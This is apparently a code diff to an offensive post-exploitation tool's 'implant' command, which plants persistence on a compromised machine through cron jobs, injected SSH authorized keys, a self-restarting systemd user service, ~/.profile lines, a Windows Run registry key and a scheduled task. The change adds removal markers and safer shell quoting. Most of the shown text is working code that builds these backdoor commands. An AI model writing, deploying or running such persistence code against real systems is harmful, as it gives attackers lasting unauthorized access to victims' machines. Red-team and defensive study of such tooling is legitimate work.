@@ -1132,6 +1132,27 @@ type implantEntry struct {
 	Method  string `json:"method"`
 	Detail  string `json:"detail"`
 	Created string `json:"created"`
+	Marker  string `json:"marker,omitempty"`
+}
+
+// implantMarker derives a stable removal token from method+detail so the
+// remove path never interpolates untrusted text into shell quotes.
+func implantMarker(method, detail, created string) string {
+	sum := fnv32(method + "\x00" + detail + "\x00" + created)
+	return fmt.Sprintf("gocat-%08x", sum)
+}
+
+func fnv32(s string) uint32 {
+	const (
+		offset = 2166136261
+		prime  = 16777619
+	)
+	h := uint32(offset)
+	for i := 0; i < len(s); i++ {
+		h ^= uint32(s[i])
+		h *= prime
+	}
+	return h
 }
 
 func implantRegistryPath(sess *session.Session) string {
@@ -1209,12 +1230,14 @@ func runImplant(sess *session.Session, args string) error {
 		}
 		method := strings.ToLower(parts[1])
 		detail := strings.Join(parts[2:], " ")
+		created := time.Now().Format(time.RFC3339)
+		marker := implantMarker(method, detail, created)
 		var setup string
 		switch method {
 		case "cron":
-			setup = fmt.Sprintf(`(crontab -l 2>/dev/null; echo "*/5 * * * * %s") | crontab -`, detail)
+			setup = fmt.Sprintf(`(crontab -l 2>/dev/null; echo "*/5 * * * * %s # %s") | crontab -`, detail, marker)
 		case "key":
-			setup = fmt.Sprintf(`mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo '%s' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys`, detail)
+			setup = fmt.Sprintf(`mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo %s >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys`, session.ShellQuote(detail))
 		case "systemd":
 			setup = `mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/gocat-sync.service <<'UNIT'
 [Unit]
@@ -1223,7 +1246,7 @@ After=network-online.target
 
 [Service]
 Type=simple
-ExecStart=/bin/sh -c '` + detail + `'
+ExecStart=/bin/sh -c ` + session.ShellQuote(detail) + `
 Restart=always
 RestartSec=60
 
@@ -1232,10 +1255,16 @@ WantedBy=default.target
 UNIT
 systemctl --user daemon-reload && systemctl --user enable --now gocat-sync.service`
 		case "profile":
-			setup = fmt.Sprintf(`grep -q -F '%s' ~/.profile 2>/dev/null || echo '%s # gocat-implant' >> ~/.profile`, detail, detail)
+			setup = fmt.Sprintf(`grep -q -F '%s' ~/.profile 2>/dev/null || echo %s >> ~/.profile`, marker, session.ShellQuote(detail+" # "+marker))
 		case "reg":
+			if strings.ContainsAny(detail, "\"&|<>()^%") {
+				return fmt.Errorf("reg detail must not contain cmd metacharacters; pass a plain executable path with simple args")
+			}
 			setup = fmt.Sprintf(`reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v GocatSync /t REG_SZ /d "%s" /f`, detail)
 		case "task":
+			if strings.ContainsAny(detail, "\"&|<>()^%") {
+				return fmt.Errorf("task detail must not contain cmd metacharacters; pass a plain executable path with simple args")
+			}
 			setup = fmt.Sprintf(`schtasks /create /tn GocatSync /tr "%s" /sc minute /mo 5 /f`, detail)
 		default:
 			return fmt.Errorf("unknown implant method '%s' (cron|key|systemd|profile|reg|task)", method)
@@ -1244,7 +1273,7 @@ systemctl --user daemon-reload && systemctl --user enable --now gocat-sync.servi
 			return fmt.Errorf("implant install failed: %w", err)
 		}
 		list := loadImplants(sess)
-		list = append(list, implantEntry{Method: method, Detail: detail, Created: time.Now().Format(time.RFC3339)})
+		list = append(list, implantEntry{Method: method, Detail: detail, Created: created, Marker: marker})
 		saveImplants(sess, list)
 		logger.Info("Implant installed via %s and tracked (#%d)", method, len(list)-1)
 		return nil
@@ -1261,17 +1290,20 @@ systemctl --user daemon-reload && systemctl --user enable --now gocat-sync.servi
 			return fmt.Errorf("implant #%d does not exist", idx)
 		}
 		entry := list[idx]
+		marker := entry.Marker
+		if marker == "" {
+			marker = implantMarker(entry.Method, entry.Detail, entry.Created)
+		}
 		switch entry.Method {
 		case "cron":
-			escaped := strings.ReplaceAll(entry.Detail, "/", `\/`)
-			_, _ = sess.Exec(fmt.Sprintf(`crontab -l 2>/dev/null | grep -v -F '%s' | grep -v '%s' | crontab - || true`, entry.Detail, escaped), 5*time.Second)
+			_, _ = sess.Exec(fmt.Sprintf(`crontab -l 2>/dev/null | grep -v -F '%s' | crontab - || true`, marker), 5*time.Second)
 		case "key":
 			fragment := entry.Detail[:min(32, len(entry.Detail))]
 			_, _ = sess.Exec(fmt.Sprintf(`grep -v -F '%s' ~/.ssh/authorized_keys > ~/.ssh/authorized_keys.tmp && mv ~/.ssh/authorized_keys.tmp ~/.ssh/authorized_keys; true`, fragment), 5*time.Second)
 		case "systemd":
 			_, _ = sess.Exec(`systemctl --user disable --now gocat-sync.service 2>/dev/null; rm -f ~/.config/systemd/user/gocat-sync.service; systemctl --user daemon-reload 2>/dev/null; true`, 5*time.Second)
 		case "profile":
-			_, _ = sess.Exec(`grep -v -F '# gocat-implant' ~/.profile > ~/.profile.tmp && mv ~/.profile.tmp ~/.profile; true`, 5*time.Second)
+			_, _ = sess.Exec(fmt.Sprintf(`grep -v -F '%s' ~/.profile > ~/.profile.tmp && mv ~/.profile.tmp ~/.profile; true`, marker), 5*time.Second)
 		case "reg":
 			_, _ = sess.Exec(`reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v GocatSync /f`, 10*time.Second)
 		case "task":
